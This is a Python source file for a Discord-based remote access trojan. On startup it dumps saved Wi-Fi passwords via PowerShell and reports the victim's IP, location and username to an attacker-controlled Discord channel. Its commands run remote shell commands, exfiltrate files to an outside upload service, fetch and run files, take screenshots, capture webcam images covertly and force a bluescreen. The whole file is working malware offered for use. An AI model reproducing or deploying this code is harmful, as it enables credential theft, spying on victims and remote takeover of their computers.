import discord
import os
import subprocess
import requests
import pyautogui
import ctypes
import asyncio
import sys
from datetime import datetime
from uuid import getnode as get_mac
from settings import *
from cv2 import VideoCapture, imwrite, CAP_DSHOW


wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""

new_ascii = """ 

 .d8888b.  888          888    888                        .d8888b.                       888 
d88P  Y88b 888          888    888                       d88P  Y88b                      888 
Y88b.      888          888    888                       888    888                      888 
 "Y888b.   888 888  888 888888 88888b.   .d88b.  888d888 888         .d88b.  888d888 .d88888 
    "Y88b. 888 888  888 888    888 "88b d8P  Y8b 888P"   888        d88""88b 888P"  d88" 888 
      "888 888 888  888 888    888  888 88888888 888     888    888 888  888 888    888  888 
Y88b  d88P 888 Y88b 888 Y88b.  888  888 Y8b.     888     Y88b  d88P Y88..88P 888    Y88b 888 
 "Y8888P"  888  "Y88888  "Y888 888  888  "Y8888  888      "Y8888P"   "Y88P"  888     "Y88888 
                    888                                                                      
               Y8b d88P                                                                      
                "Y88P"  -Made by Isaaclins

    Usage:
    .help               - Shows this message
    .ping               - latency delay of the bot
    .cd <directory>     - Change Directory   
    .ls                 - List Directory
    .download <file>    - Download File   
    .upload <link>      - Upload File from link
    .cmd <cmd>          - Execute CMD Command 
    .run <file>         - Run an File   
    .screenshot OR .ss  - Take a Screenshot of the first monitor
    .blue               - sends a bluescreen ;)
    .start              - Adds the bot to the startup directory
    .exit               - closes the connection to the bot                                             
"""
commands = "\n".join([
    "help - Help Command",
    "ping - Ping Command",
    "cd - Change Directory",
    "ls - List Directory",
    "download <file> - Download File",
    "upload <link> - Upload File",
    "cmd - Execute CMD Command",
    "run <file> - Run an File",
    "screenshot - Take a Screenshot",
    "blue - DeadScreen",
    "start - Add To start",
    "exit - Exit The Session",
])
intents = discord.Intents.all()
intents.members = True
client = discord.Client(intents=intents)
async def find_channel_by_name(guild, channel_name):
    for channel in guild.channels:
        if channel.name == channel_name:
            return channel
    return None

@client.event
async def on_ready():
    output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
    decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
    response = requests.get('https://ipapi.co/json/')
    data = response.json()
    ip_address = data.get('ip')
    city = data.get('city')
    country = data.get('country')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    username = os.getlogin()
    guild = client.get_guild(int(guild_id))
    mac_address = str(get_mac())
    channel = await find_channel_by_name(guild, mac_address)
    if channel:
        embed=discord.Embed(title="**Connection Reestablished with: ** ```" + username +"```",colour=0x3)
        embed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
        embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
        embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
        embed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
        embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**SSID & Passwords:**",value=f"```{decoded_wifi_pwd}```",inline=True)
        embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
        embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
        embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
        message = await channel.send(embed=embed)
        await message.pin()
    else:
        print("Channel with name {} does not exist. Creating...".format(mac_address))
        channel = await guild.create_text_channel(mac_address)
        embed = discord.Embed(title="**Established connection**",colour=0x36393f, timestamp=datetime.now())
        embed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
        embed.add_field(name="**IP Adress:**",value=f"```{ip_address}```",inline=True)
        embed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
        embed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
        embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
        embed.add_field(name="ㅤ", value="ㅤ",inline=True)
        embed.add_field(name="**Wifi:**",value=f"```{decoded_wifi_pwd}```",inline=True)

        embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
        embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
        embed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
        message = await channel.send(embed=embed)
        await message.pin()

@client.event
async def on_message(message):
    guild = client.get_guild(int(guild_id))
    if message.author != client.user:
    
        if message.channel.name == str(get_mac()): 
            
            match message.content.lower():
                case ".help":
                    embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                    await message.reply(embed=embed)
                case ".ping":
                    await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
                case ".cd":
                    directory = message.content[3:]
                    try:
                        os.chdir(directory)
                        files = "\n".join(os.listdir())
                        if files == "":
                            files = "No Files Found"
                        embed = discord.Embed(title=f"Changed Directory > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                    except:
                        embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                    await message.reply(embed=embed) 
                case ".ls":
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                    await message.reply(embed=embed)  
                case ".exit":
                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")
                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                           await message.channel.delete()
                           await client.close()
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")

                case ".blue":
                    new_msg = await message.reply("Are you sure you want to start a bluescreen?")
                    await new_msg.add_reaction("✅")
                    await new_msg.add_reaction("❌")

                    def check(reaction, user):
                        return user == message.author and str(reaction.emoji) in ["✅", "❌"]

                    try:
                        reaction, user = await client.wait_for('reaction_add', timeout=60, check=check)
                        if str(reaction.emoji) == "✅":
                            await message.reply("Attempting...", delete_after = .1)
                            ntdll = ctypes.windll.ntdll
                            prev_value = ctypes.c_bool()
                            res = ctypes.c_ulong()
                            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                                await message.reply("Blue Successful!")
                            else:
                                await message.reply("Blue Failed! :(")
                        elif str(reaction.emoji) == "❌":
                            delmsg =await message.channel.send("Cancelled bluescreen.")
                            await message.delete()
                            await new_msg.delete()
                            await delmsg.delete()
                    except asyncio.TimeoutError:
                        await message.channel.send("You didn't react in time.")
                case ".ss":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await message.reply(embed=embed, file=file)
                case ".screenshot":
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await message.reply(embed=embed, file=file)

                case ".pic":
                    webcam = VideoCapture(0, CAP_DSHOW)
                    result, image = webcam.read()
                    imwrite('webcam.png', image)
                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                    subprocess.run('del webcam.png', shell=True)
                case ".photo":
                    webcam = VideoCapture(0, CAP_DSHOW)
                    result, image = webcam.read()
                    imwrite('webcam.png', image)
                    await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
                    subprocess.run('del webcam.png', shell=True)

                case ".purge":  
                    await message.reply('Purging...')
                    await message.channel.purge(limit=None)               

            if message.content.lower().startswith(".download"):
                file = message.content[10:]
                try:
                    link = requests.post("https://api.letsupload.cc/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                    embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
                    await message.reply(embed=embed)
                except:
                    embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                    await message.reply(embed=embed)

            if message.content.lower().startswith(".upload"):
                link = message.content[8:]
                file = requests.get(link).content
                with open(os.path.basename(link), "wb") as f:
                    f.write(file)
                embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.lower().startswith(".shell"):
                command = message.content[7:]
                output = subprocess.Popen(
                    ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                ).communicate()[0].decode("utf-8")
                if output == "":
                    output = "No output"
                embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                await message.reply(embed=embed)

            if message.content.lower().startswith(".run"):
                file = message.content[5:]
                subprocess.Popen(file, shell=True)
                embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                await message.reply(embed=embed)

        else:
            print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)

client.run(bot_token)